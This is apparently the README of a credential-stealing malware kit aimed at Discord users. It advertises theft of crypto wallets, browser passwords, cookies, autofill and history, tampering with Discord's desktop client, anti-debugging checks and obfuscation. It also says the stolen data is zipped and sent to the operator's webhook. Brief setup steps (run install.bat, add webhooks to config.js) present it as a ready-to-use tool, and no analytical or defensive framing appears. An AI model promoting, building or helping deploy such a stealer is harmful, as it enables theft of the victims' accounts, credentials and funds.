- Searches for wallets in system and grabs them
- Grabs passwords, cookies, bookmarks & Extension cookies from all major browsers (Chrome, Opera, Brave, Yandex, Microsoft Edge)
- Silently saves all data separate in a zip file in a hidden folder and sends it to your webhook
- Modifies discord's desktop core (like known grabbers such as bbystealer & PirateStealer aka. Brooklyn/Arizona)
- Checks for debugging processes to avoid your webhook skid being reversed from skids (loop)
- Ultra high quality obfuscation
- Easy to setup (just modify the "config.js" file)
- Sends everything to your webhook in beautiful embeds
- Analyzes the data which was stolen and sends a zip file to your discord webhook
- Browser autofill grabber
- Browser history grabber

## Setup:
- Download the files

- Install the required packages by running `install.bat`
- Edit the `config.js` file and put your webhooks in it
